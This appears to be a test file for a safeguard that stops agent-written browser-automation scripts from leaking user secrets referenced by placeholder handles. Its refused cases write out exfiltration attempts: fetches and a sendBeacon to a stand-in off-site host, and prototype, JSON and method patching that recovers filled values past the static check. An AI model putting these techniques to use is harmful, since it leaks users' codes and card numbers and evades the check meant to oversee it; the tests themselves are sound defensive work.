import { Schema } from "effect";
import { describe, expect, it } from "vitest";
import {
  isSecretHandle,
  makeSecretHandles,
  SecretHandlesSnapshot,
  publishedHandlePath,
  secretHandleRefusal,
} from "../../src/mint/secret-handles.js";
import { standaloneNumber } from "../support/canary.js";

const site = "https://portal.example.com";
const handle = "{{secret.s1}}";
type FileQuote = "'" | '"' | "`";

/** A Kernel script whose one execute call sends `code`, written with the given file literal. */
const kernelStep = (code: string, quote: FileQuote = "`") =>
  `export default async ({ kernel, sessionId }) => {\n  const answer = await kernel.browsers.playwright.execute(sessionId, {\n    timeout_sec: 30,\n    code: ${quote}${code}${quote},\n  });\n  return answer.result;\n};\n`;

const imported = async (source: string): Promise<unknown> => {
  const module: unknown = await import(
    `data:text/javascript,${encodeURIComponent(source)}#${Math.random()}`
  );
  return typeof module === "object" && module !== null ? Reflect.get(module, "default") : undefined;
};

/** Runs Kernel code as Kernel does: an async function body with `page` in scope. */
const runKernelCode = async (code: string, page: unknown, fetch: unknown): Promise<unknown> => {
  const body = await imported(`export default async (page, fetch) => {\n${code}\n};`);
  if (typeof body !== "function") throw new Error("Not a function");
  return Reflect.apply(body, undefined, [page, fetch]);
};

/** Runs a filled Kernel step against a recording page and returns what reached the page. */
const sentToSite = async (source: string) => {
  const sent: unknown[][] = [];
  const locator: Record<string, unknown> = {};
  const record =
    (name: string) =>
    (...args: unknown[]) => {
      sent.push([name, ...args]);
      return locator;
    };
  for (const name of ["fill", "type", "pressSequentially", "locator", "getByLabel", "first"])
    locator[name] = record(name);
  const page = {
    ...locator,
    keyboard: { type: record("keyboard.type") },
    request: { post: record("request.post") },
  };
  const step = await imported(source);
  if (typeof step !== "function") throw new Error("No default export");
  await Reflect.apply(step, undefined, [
    {
      sessionId: "session",
      kernel: {
        browsers: {
          playwright: {
            execute: async (_session: string, options: { code: string }) => ({
              success: true,
              result: await runKernelCode(options.code, page, record("fetch")),
            }),
          },
        },
      },
    },
  ]);
  return sent;
};

const issued = (value: string) => {
  const handles = makeSecretHandles();
  handles.issue({ code: { type: "secret", value } });
  return handles;
};

describe("secret handles", () => {
  it("numbers handles across requests in one attempt and leaves other answers as given", async () => {
    const handles = makeSecretHandles();
    expect(
      handles.issue({
        code: { type: "secret", value: "111111" },
        plan: { type: "choice", value: "gold" },
      }),
    ).toEqual({
      code: { type: "secret", value: "{{secret.s1}}" },
      plan: { type: "choice", value: "gold" },
    });
    // A second request reusing the question id gets a new handle, never the first one.
    expect(handles.issue({ code: { type: "secret", value: "222222" } })).toEqual({
      code: { type: "secret", value: "{{secret.s2}}" },
    });
    const source = kernelStep(
      'await page.fill("#first", "{{secret.s1}}"); await page.locator("#second").fill("{{secret.s2}}");',
    );
    const files = new Map([["explore/step.mjs", source]]);
    expect(handles.misplaced(files, site)).toBeUndefined();
    const filled = handles.fill(files, site).get("explore/step.mjs") ?? "";
    expect(filled).not.toContain("{{secret.");
    expect(await sentToSite(filled)).toEqual([
      ["fill", "#first", "111111"],
      ["locator", "#second"],
      ["fill", "222222"],
    ]);
  });

  it.each([
    ["a double-quoted literal in a template", '"', "`"],
    ["a single-quoted literal in a template", "'", "`"],
    ["a double-quoted literal in a single-quoted string", '"', "'"],
    ["a single-quoted literal in a double-quoted string", "'", '"'],
    ["a template literal in a single-quoted string", "`", "'"],
  ] as const)(
    "fills a value that could break out of %s as that exact value",
    async (_name, inner, outer) => {
      const value = "a'b\"c`d${globalThis.leak}\\e\nf g h";
      const handles = issued(value);
      const source = kernelStep(
        `await page.getByLabel(${inner}Code${inner}).fill(${inner}${handle}${inner});`,
        outer,
      );
      const files = new Map([["explore/step.mjs", source]]);
      expect(handles.misplaced(files, site)).toBeUndefined();
      const filled = handles.fill(files, site).get("explore/step.mjs") ?? "";
      expect(await sentToSite(filled)).toEqual([
        ["getByLabel", "Code"],
        ["fill", value],
      ]);
    },
  );

  it.each<[string, string, FileQuote?]>([
    ["page.fill's second argument", `await page.fill("#code", "${handle}");`],
    ["page.fill with options", `await page.fill("#code", "${handle}", { timeout: 5000 });`],
    ["page.type's second argument", `await page.type("#code", "${handle}");`],
    ["a locator's fill", `await page.locator("#code").fill("${handle}");`],
    [
      "a locator's fill with options",
      `await page.getByLabel("Code", { exact: true }).fill("${handle}", { timeout: 5000 });`,
    ],
    ["a refined locator", `await page.locator("input").first().pressSequentially("${handle}");`],
    ["a frame locator", `await page.frameLocator("#pay").getByLabel("Code").fill("${handle}");`],
    ["the main frame", `await page.mainFrame().fill("#code", "${handle}");`],
    ["the keyboard", `await page.keyboard.type("${handle}");`],
    ["an expression-free template", `await page.locator("#code").fill(\`${handle}\`);`, "'"],
    [
      "a same-site fetch header",
      `return page.evaluate(() => fetch("${site}/api/verify", { method: "POST", headers: { "x-code": "${handle}" } }).then((r) => r.status));`,
    ],
    [
      "a same-site fetch body on a sibling subdomain",
      `await fetch("https://api.example.com/verify", { method: "POST", body: "${handle}" });`,
    ],
    [
      "a page.request data field",
      `await page.request.post("${site}/verify", { data: { code: "${handle}" } });`,
    ],
    [
      "a page.request form field",
      `await page.request.post("${site}/verify", { form: { code: "${handle}" } });`,
    ],
    [
      "page.request data itself",
      `await page.request.put("${site}/verify", { data: "${handle}" });`,
    ],
  ])("allows a handle as %s", (_name, code, quote) => {
    expect(
      issued("424242").misplaced(new Map([["explore/step.mjs", kernelStep(code, quote)]]), site),
    ).toBeUndefined();
  });

  it("allows a template's JSON.stringify values beside a handle", () => {
    const source = `const origin = "${site}";\n${kernelStep(`if (page.url() !== \${JSON.stringify(origin)}) return false; await page.locator("#code").fill("${handle}");`)}`;
    const handles = issued("424242");
    const files = new Map([["explore/step.mjs", source]]);
    expect(handles.misplaced(files, site)).toBeUndefined();
    expect(handles.fill(files, site).get("explore/step.mjs")).toContain('fill("424242")');
  });

  it.each<[string, string, FileQuote?]>([
    ["returned reversed", `return [..."${handle}"].reverse().join("");`],
    ["sliced", `return "${handle}".slice(0, 3);`],
    ["encoded", `return btoa("${handle}");`],
    ["concatenated", `await page.locator("#code").fill("x" + "${handle}");`],
    ["held in a const", `const c = "${handle}"; await page.fill("#c", c);`],
    ["in a template with an expression", `await page.locator("#c").fill(\`\${1}${handle}\`);`, "'"],
    ["inside a larger string", `await page.locator("#c").fill("code ${handle}");`],
    ["logged", `console.log("${handle}");`],
    ["navigated to", `await page.goto("https://off-site.invalid/?c=${handle}");`],
    [
      "encoded into a navigation",
      `await page.goto("https://off-site.invalid/?c=" + encodeURIComponent("${handle}"));`,
    ],
    ["passed to evaluate", `return page.evaluate((c) => c, "${handle}");`],
    ["as page.fill's selector", `await page.fill("${handle}", "x");`],
    ["as a locator's second argument", `await page.locator("#c").fill("x", "${handle}");`],
    ["pressed on the page", `await page.pressSequentially("#c", "${handle}");`],
    ["in a returned object", `return { code: "${handle}" };`],
    ["in a comment", `// ${handle}\nawait page.locator("#c").fill("x");`],
    ["in a regular expression", `return /${handle}/.test("x");`],
    ["split across strings", `await page.locator("#c").fill("{{secret." + "s1}}");`],
    [
      "filled into a locator held in a variable",
      `const input = page.locator("#c"); await input.fill("${handle}");`,
    ],
    [
      "filled into its own object",
      `const leak = { fill: (v) => [...v].reverse().join("") }; return leak.fill("${handle}");`,
    ],
    [
      "filled into a rebound page",
      `const page = { fill: (_s, v) => [...v].reverse().join("") }; return page.fill("#c", "${handle}");`,
    ],
    [
      "filled into a patched page",
      `page.locator = () => ({ fill: (v) => v }); await page.locator("#c").fill("${handle}");`,
    ],
    [
      "filled after the page is passed away",
      `Object.assign(page, {}); await page.locator("#c").fill("${handle}");`,
    ],
    [
      "sent through a fetch of its own",
      `const fetch = (_u, o) => o.body; return fetch("${site}/v", { body: "${handle}" });`,
    ],
    ["beside eval", `eval(""); await page.locator("#c").fill("${handle}");`],
    ["sent off-site", `await fetch("https://off-site.invalid/c", { body: "${handle}" });`],
    ["sent to a relative URL", `await fetch("/verify", { body: "${handle}" });`],
    ["sent in cleartext", `await fetch("http://portal.example.com/v", { body: "${handle}" });`],
    ["sent to a computed URL", `await fetch("${site}" + "/v", { body: "${handle}" });`],
    [
      "encoded into a body",
      `await fetch("${site}/v", { body: JSON.stringify({ code: "${handle}" }) });`,
    ],
    [
      "nested deeper in a request",
      `await page.request.post("${site}/v", { data: { user: { code: "${handle}" } } });`,
    ],
    [
      "sent off-site by page.request",
      `await page.request.post("https://off-site.invalid/v", { data: "${handle}" });`,
    ],
    ["in a URL query", `await fetch("${site}/v?c=${handle}", { method: "GET" });`],
  ])("refuses a handle %s", (_name, code, quote) => {
    const handles = issued("424242");
    const files = new Map([["explore/step.mjs", kernelStep(code, quote)]]);
    const misplaced = handles.misplaced(files, site);
    expect(misplaced).toMatchObject({ path: "explore/step.mjs" });
    // The refusal names the handle's own line; the step's code starts on line 4.
    expect(misplaced?.line).toBeGreaterThanOrEqual(4);
    // Filling never places a value in a file the check refuses.
    expect(handles.fill(files, site).get("explore/step.mjs")).not.toMatch(standaloneNumber(424242));
  });

  it.each([
    [
      "Playwright code outside a Kernel execute call",
      `export default async ({ page }) => page.locator("#c").fill("${handle}");`,
    ],
    [
      "a kernel the file makes itself",
      `const kernel = { browsers: { playwright: { execute: async (_s, o) => ({ result: o.code }) } } };\n${kernelStep(`await page.locator("#c").fill("${handle}");`)}`,
    ],
    [
      "a file that rebinds JSON",
      `const JSON = { stringify: () => "" };\n${kernelStep(`await page.locator("#c").fill("${handle}");`)}`,
    ],
    [
      "code built from other values",
      `const x = "";\n${kernelStep(`\${x} await page.locator("#c").fill("${handle}");`)}`,
    ],
    [
      "code with an escape before the handle",
      kernelStep(`await page.locator("#c")\\n.fill("${handle}");`),
    ],
    ["source that does not parse", `export default {{ "${handle}"`],
  ])("refuses a handle in %s", (_name, source) => {
    expect(issued("424242").misplaced(new Map([["explore/step.mjs", source]]), site)).toMatchObject(
      { path: "explore/step.mjs" },
    );
  });

  it("refuses a handle in JSON, which only code could read into a variable", () => {
    const handles = issued("424242");
    const files = new Map([["explore/input.json", `{\n  "code": "${handle}"\n}`]]);
    expect(handles.misplaced(files, site)).toEqual({ path: "explore/input.json", line: 2 });
    expect(handles.fill(files, site).get("explore/input.json")).toContain(handle);
  });

  it("refuses a request field when the attempt has no site", () => {
    const code = `await fetch("${site}/v", { body: "${handle}" });`;
    expect(
      issued("424242").misplaced(new Map([["explore/step.mjs", kernelStep(code)]]), undefined),
    ).toMatchObject({ path: "explore/step.mjs" });
  });

  it("fills only authored source and reports handles it never issued", () => {
    const handles = issued("424242");
    const files = new Map([
      [
        "src/step.mjs",
        kernelStep(
          'await page.fill("#a", "{{secret.s1}}"); await page.fill("#b", "{{secret.s7}}");',
        ),
      ],
      [".agents/caller-input/SKILL.md", "Write {{secret.s1}} or {{secret.<id>}} in the source."],
      ["wrapped.mjs", "// {{secret.s1}} {{ secret.code }}"],
      ["explore/other.mjs", "export default '{{ secret.code }}';"],
    ]);
    expect(handles.unissued(files)).toEqual(["{{secret.s7}}", "{{ secret.code }}"]);
    const filled = handles.fill(files, site);
    expect(filled.get("src/step.mjs")).toContain('page.fill("#a", "424242")');
    expect(filled.get("src/step.mjs")).toContain('page.fill("#b", "{{secret.s7}}")');
    expect(filled.get(".agents/caller-input/SKILL.md")).toContain("{{secret.s1}}");
    expect(filled.get("wrapped.mjs")).toBe("// {{secret.s1}} {{ secret.code }}");
    // Only authored source is checked.
    expect(handles.misplaced(files, site)).toEqual({ path: "explore/other.mjs", line: 1 });
    files.delete("explore/other.mjs");
    expect(handles.misplaced(files, site)).toBeUndefined();
  });

  it("finds a handle in any file publication would ship, and only there", () => {
    const files = new Map([
      ["src/tool.mjs", "import {code} from './code.mjs'; export default {code};"],
      ["src/code.mjs", "export const code = '{{secret.s1}}';"],
      ["explore/verify.mjs", "export default '{{secret.s1}}';"],
    ]);
    expect(publishedHandlePath(files, ["src/tool.mjs"])).toBe("src/code.mjs");
    files.set("src/code.mjs", "export const code = await ask('code');");
    expect(publishedHandlePath(files, ["src/tool.mjs"])).toBeUndefined();
  });

  // Code written to recover a filled value can still do so (the check is static, and Guardian is
  // the backstop); these are the cheap closures for the ways found in review.
  it.each<[string, string]>([
    [
      "the keyboard redefined with Object.defineProperty",
      `Object.defineProperty(page.keyboard, "type", { value: async (t) => { globalThis.cap = t; } }); await page.keyboard.type("${handle}"); return [...globalThis.cap].reverse().join("");`,
    ],
    [
      "a filled field read back with inputValue",
      `await page.locator("#c").fill("${handle}"); return [...(await page.locator("#c").inputValue())].reverse().join("");`,
    ],
    [
      "a typed field read back through evaluate",
      `await page.locator("#c").fill("${handle}"); return page.evaluate(() => [...document.querySelector("#c").value].reverse().join(""));`,
    ],
    [
      "a typed field read back through $eval",
      `await page.fill("#c", "${handle}"); return page.$eval("#c", (e) => btoa(e.value));`,
    ],
    [
      "the global fetch replaced with Object.defineProperty",
      `let cap; Object.defineProperty(globalThis, "fetch", { value: async (_u, o) => { cap = o.body; } }); await fetch("${site}/v", { method: "POST", body: "${handle}" }); return [...cap].reverse().join("");`,
    ],
    [
      "the Locator prototype patched",
      `let cap; Object.getPrototypeOf(page.locator("x")).fill = async function (v) { cap = v; }; await page.locator("#c").fill("${handle}"); return btoa(cap);`,
    ],
    [
      "a prototype reached by a computed key",
      `let cap; const k = "__pro" + "to__"; const proto = page.locator("x")[k]; proto.fill = async (v) => { cap = v; }; await page.locator("#c").fill("${handle}"); return btoa(cap);`,
    ],
    [
      "the page's fetch redefined inside evaluate",
      `await page.evaluate(() => { Object.defineProperty(window, "fetch", { value: (u, o) => navigator.sendBeacon("https://off-site.invalid", btoa(o.headers["x-c"])) }); }); await page.evaluate(() => fetch("${site}/v", { headers: { "x-c": "${handle}" } }));`,
    ],
    [
      "JSON patched in Kernel code",
      `let cap; JSON.stringify = (v) => { cap = v; return "0"; }; await page.locator("#c").fill("${handle}"); return btoa(cap);`,
    ],
    [
      "a global method replaced",
      `let cap; Buffer.from = (v) => { cap = v; return v; }; await page.locator("#c").fill("${handle}"); return btoa(cap);`,
    ],
  ])("refuses a handle beside %s", (_name, code) => {
    const handles = issued("MK7Q2Z94");
    const files = new Map([["explore/step.mjs", kernelStep(code)]]);
    expect(handles.misplaced(files, site)).toMatchObject({ path: "explore/step.mjs", line: 4 });
    expect(handles.fill(files, site).get("explore/step.mjs")).not.toContain("MK7Q2Z94");
  });

  it.each<[string, string]>([
    [
      "patches JSON.stringify so a substitution injects code beside the handle",
      `JSON.stringify = () => 'undefined; Object.getPrototypeOf(page.locator("x")).fill = async (v) => { globalThis.cap = v; };';\n${kernelStep(`void \${JSON.stringify(1)}; await page.locator("#c").fill("${handle}"); return [...globalThis.cap].reverse().join("");`)}`,
    ],
    [
      "imports itself to read its filled source",
      `import me from "./step.mjs";\nexport default async ({ kernel, sessionId }) => {\n  await kernel.browsers.playwright.execute(sessionId, { code: \`await page.locator("#c").fill("${handle}");\` });\n  return btoa(String(me));\n};\n`,
    ],
    [
      "reads its own file from disk",
      `import { readFileSync } from "node:fs";\nexport default async ({ kernel, sessionId }) => {\n  await kernel.browsers.playwright.execute(sessionId, { code: \`await page.locator("#c").fill("${handle}");\` });\n  return btoa(readFileSync("explore/step.mjs", "utf8"));\n};\n`,
    ],
    [
      "reads its own module URL",
      `export default async ({ kernel, sessionId }) => {\n  await kernel.browsers.playwright.execute(sessionId, { code: \`await page.locator("#c").fill("${handle}");\` });\n  return import.meta.url;\n};\n`,
    ],
    [
      "wraps Kernel's execute to keep the filled code",
      `export default async ({ kernel, sessionId }) => {\n  let seen = "";\n  const run = kernel.browsers.playwright.execute;\n  kernel.browsers.playwright.execute = (s, o) => { seen = o.code; return run(s, o); };\n  await kernel.browsers.playwright.execute(sessionId, { code: \`await page.locator("#c").fill("${handle}");\` });\n  return [...seen].reverse().join("");\n};\n`,
    ],
    [
      "patches a prototype Kernel's client serializes through",
      `Object.prototype.toJSON = function () { return btoa(JSON.stringify({ ...this })); };\n${kernelStep(`await page.locator("#c").fill("${handle}");`)}`,
    ],
  ])("refuses a file that %s", (_name, source) => {
    const handles = issued("MK7Q2Z94");
    const files = new Map([["explore/step.mjs", source]]);
    expect(handles.misplaced(files, site)).toMatchObject({ path: "explore/step.mjs" });
    expect(handles.fill(files, site).get("explore/step.mjs")).not.toContain("MK7Q2Z94");
  });

  it("still allows ordinary code beside a handle", () => {
    const source = `export default async ({ kernel, sessionId }) => {\n  const answer = await kernel.browsers.playwright.execute(sessionId, {\n    code: \`await new Promise((resolve) => setTimeout(resolve, 1)); const rows = [1, 2]; await page.locator("#c").fill("${handle}"); return JSON.stringify({ first: rows[0], text: await page.locator("h1").textContent() });\`,\n  });\n  return JSON.parse(answer.result);\n};\n`;
    const handles = issued("424242");
    const files = new Map([["explore/step.mjs", source]]);
    expect(handles.misplaced(files, site)).toBeUndefined();
    const filled = handles.fill(files, site).get("explore/step.mjs") ?? "";
    expect(filled).toContain('fill("424242")');
  });

  it("allows a handle in an operation whose helper takes kernel as a parameter", () => {
    const source = `import { defineOperation } from "../src/runtime/index.js";\nconst enterCode = async ({ kernel, sessionId, siteOrigin }) => {\n  const done = await kernel.browsers.playwright.execute(sessionId, {\n    code: \`if (new URL(page.url()).origin !== \${JSON.stringify(siteOrigin)}) return false; await page.getByLabel("Code", { exact: true }).fill("${handle}"); return true;\`,\n  });\n  if (!done.success) throw new Error(String(done.error));\n  return done.result;\n};\nexport default defineOperation({ name: "enter_code" }, async (context) => ({ entered: await enterCode(context) }));\n`;
    const handles = issued("424242");
    const files = new Map([["explore/enter-code.mjs", source]]);
    expect(handles.misplaced(files, site)).toBeUndefined();
    expect(handles.fill(files, site).get("explore/enter-code.mjs")).toContain('fill("424242")');
  });

  it("allows a handle in TypeScript whose types name kernel, JSON and a prototype", () => {
    const source = `type Context = { kernel: { browsers: unknown }; sessionId: string; parse: typeof JSON.parse };\ninterface Shape { prototype: unknown }\nexport default async ({ kernel, sessionId }: Context): Promise<Shape | undefined> => {\n  await kernel.browsers.playwright.execute(sessionId, { code: \`await page.locator("#c").fill("${handle}");\` });\n  return undefined;\n};\n`;
    const handles = issued("424242");
    const files = new Map([["explore/step.ts", source]]);
    expect(handles.misplaced(files, site)).toBeUndefined();
    expect(handles.fill(files, site).get("explore/step.ts")).toContain('fill("424242")');
  });

  it("recognizes only issued handles as model-visible secret answers", () => {
    expect(isSecretHandle("{{secret.s12}}")).toBe(true);
    expect(isSecretHandle("{{secret.s0}}")).toBe(false);
    expect(isSecretHandle("123456")).toBe(false);
    expect(isSecretHandle("{{secret.s1}} 123456")).toBe(false);
  });
});

it("restores exact private handles and continues numbering without replacing prior secrets", async () => {
  const original = makeSecretHandles();
  const answers = original.issue({ code: { type: "secret", value: "first-private-code" } });
  const restored = makeSecretHandles(
    Schema.decodeUnknownSync(SecretHandlesSnapshot)(
      JSON.parse(JSON.stringify(original.snapshot())),
    ),
  );
  expect(restored.issue({ code: { type: "secret", value: "second-private-code" } })).toEqual({
    code: { type: "secret", value: "{{secret.s2}}" },
  });
  const issuedCode = answers.code?.value;
  if (typeof issuedCode !== "string") throw new Error("Expected a string secret handle");
  const files = new Map([
    [
      "src/tool.mjs",
      kernelStep(
        `await page.fill("#first", "${issuedCode}"); await page.fill("#second", "{{secret.s2}}");`,
      ),
    ],
  ]);
  expect(restored.unissued(files)).toEqual([]);
  expect(await sentToSite(restored.fill(files, site).get("src/tool.mjs") ?? "")).toEqual([
    ["fill", "#first", "first-private-code"],
    ["fill", "#second", "second-private-code"],
  ]);
});

describe("secretHandleRefusal", () => {
  const handles = () => {
    const issued = makeSecretHandles();
    issued.issue({ code: { type: "secret", value: "private-code-value" } });
    return issued;
  };
  const step = (
    purpose: "explore" | "example" | "authenticate" | "test",
    entrypoint = "explore/step.mjs",
    target: "liveBrowser" | "pureFiles" = "liveBrowser",
  ) => ({ purpose, target, entrypoint });

  it("refuses a handle this attempt never issued, on live steps other than sign-in", () => {
    const files = new Map([
      ["explore/step.mjs", kernelStep('await page.getByLabel("Code").fill("{{secret.s9}}");')],
    ]);
    expect(secretHandleRefusal(handles(), files, step("explore"), site)).toBe(
      "The source names {{secret.s9}}, which no request_input secret answer in this attempt returned. Use only a handle an answer gave you, exactly as given. Nothing was executed.",
    );
    // Offline targets never receive a value and run the handle text as written.
    expect(
      secretHandleRefusal(handles(), files, step("test", "explore/step.mjs", "pureFiles"), site),
    ).toBeUndefined();
    expect(secretHandleRefusal(handles(), files, step("authenticate"), site)).toBeUndefined();
  });

  it("refuses a handle outside a site-input sink with its file, line and rule", () => {
    const files = new Map([
      [
        "explore/leak.mjs",
        `const handle = "{{secret.s1}}";\nconsole.log(handle);\nexport default {};`,
      ],
    ]);
    const refusal = secretHandleRefusal(
      handles(),
      files,
      step("explore", "explore/leak.mjs"),
      site,
    );
    // The rule, then an example of exactly what the check accepts: the whole string literal in
    // the Playwright code of a page-execute call.
    expect(refusal).toBe(
      'explore/leak.mjs line 1: a secret handle may only be the whole string passed as the value to fill, type or pressSequentially, or a field of a request to this site, in code that never reads a typed field back (inputValue, evaluate), reads its own source, or redefines JSON, a global, a prototype or a page, keyboard or Kernel method; anything else is refused. Write the handle as the whole string literal in the Playwright code of a kernel.browsers.playwright.execute call, such as page.getByLabel("Code").fill("{{secret.s1}}"). Nothing was executed.',
    );
  });

  it("refuses an example whose published source holds a handle, and lets an explore run it", () => {
    const files = new Map([
      ["src/tool.mjs", kernelStep('await page.getByLabel("Code").fill("{{secret.s1}}");')],
    ]);
    expect(secretHandleRefusal(handles(), files, step("example", "src/tool.mjs"), site)).toContain(
      "src/tool.mjs holds a secret handle. An example runs the source you publish",
    );
    expect(
      secretHandleRefusal(handles(), files, step("explore", "src/tool.mjs"), site),
    ).toBeUndefined();
  });
});

describe("card handles", () => {
  const card = () => {
    const handles = makeSecretHandles();
    handles.issue(
      {
        number: { type: "secret", value: "4242424242424242" },
        code: { type: "secret", value: "551234" },
      },
      { number: "card_number", code: "one_time_code" },
    );
    return handles;
  };
  const cardSource = kernelStep(
    'await page.frameLocator("iframe").getByLabel("Card number").fill("{{secret.s1}}");',
  );

  it("records each card answer's kind and nothing for other secrets", () => {
    const handles = card();
    expect(handles.kindOf("{{secret.s1}}")).toBe("card_number");
    expect(handles.kindOf("{{secret.s2}}")).toBeUndefined();
    expect(handles.cardValues(["{{secret.s1}}"])).toEqual(["4242424242424242"]);
    expect(handles.cardValues(["{{secret.s1}}", "{{secret.s2}}"])).toBeUndefined();
    expect(handles.cardValues(["{{secret.s7}}"])).toBeUndefined();
  });

  it("refuses a card handle anywhere in source, even in a site-input sink", () => {
    const files = new Map([["explore/card.mjs", cardSource]]);
    expect(
      secretHandleRefusal(
        card(),
        files,
        { purpose: "explore", target: "liveBrowser", entrypoint: "explore/card.mjs" },
        site,
      ),
    ).toBe(
      "explore/card.mjs line 4: {{secret.s1}} is a card answer, which never goes into source. Type it with a card-fill step: operation/card-fill-step.json, run with purpose card_fill. Nothing was executed.",
    );
  });

  it("never fills a card handle into source", () => {
    const files = new Map([["explore/card.mjs", cardSource]]);
    expect(card().fill(files, site).get("explore/card.mjs")).toBe(cardSource);
  });

  it("keeps an OTP handle working as before", async () => {
    const files = new Map([
      ["explore/code.mjs", kernelStep('await page.getByLabel("Code").fill("{{secret.s2}}");')],
    ]);
    const handles = card();
    expect(
      secretHandleRefusal(
        handles,
        files,
        { purpose: "explore", target: "liveBrowser", entrypoint: "explore/code.mjs" },
        site,
      ),
    ).toBeUndefined();
    expect(await sentToSite(handles.fill(files, site).get("explore/code.mjs") ?? "")).toEqual([
      ["getByLabel", "Code"],
      ["fill", "551234"],
    ]);
  });

  it("keeps card kinds across a snapshot and restores an older snapshot without them", () => {
    const restored = makeSecretHandles(
      Schema.decodeUnknownSync(SecretHandlesSnapshot)(JSON.parse(JSON.stringify(card().snapshot()))),
    );
    expect(restored.kindOf("{{secret.s1}}")).toBe("card_number");
    const older = makeSecretHandles(
      Schema.decodeUnknownSync(SecretHandlesSnapshot)([["{{secret.s1}}", "private-code"]]),
    );
    expect(older.kindOf("{{secret.s1}}")).toBeUndefined();
  });
});
